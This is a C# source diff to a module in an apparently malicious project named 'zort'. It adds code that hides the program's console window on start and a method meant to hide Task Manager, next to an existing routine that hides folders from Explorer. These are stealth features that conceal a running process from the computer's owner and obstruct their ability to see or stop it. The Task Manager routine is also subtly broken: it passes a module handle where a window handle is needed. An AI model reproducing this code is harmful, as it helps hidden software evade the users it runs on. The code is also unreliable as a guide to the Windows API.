@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -15,13 +16,36 @@ namespace zort
 
         public void Start()
         {
-            ModuleLogger.Log(this, "Hidden files are now hidden from explorer.");
+            HideConsole();
+            ModuleLogger.Log(this, "Console window is now hidden.");
             HideHiddenFoldersFromExplorer();
+            ModuleLogger.Log(this, "Hidden files are now hidden from explorer.");
         }
 
         public void Stop()
         {
             // No need to stop anything
+        }
+
+        public static void HideConsole()
+        {
+
+            IntPtr consoleWindow = NativeMethods.GetConsoleWindow();
+            if (consoleWindow != IntPtr.Zero)
+            {
+                NativeMethods.ShowWindow(consoleWindow, NativeMethods.SW_HIDE);
+            }
+        }
+
+        public static void MinimizeTaskManager()
+        {
+            //get task manager window handle
+            IntPtr taskManagerHandle = NativeMethods.GetModuleHandle("Taskmgr.exe");
+            if (taskManagerHandle != IntPtr.Zero)
+            {
+                //minimize task manager window
+                NativeMethods.ShowWindow(taskManagerHandle, NativeMethods.SW_HIDE);
+            }
         }
 
         public static void HideHiddenFoldersFromExplorer()
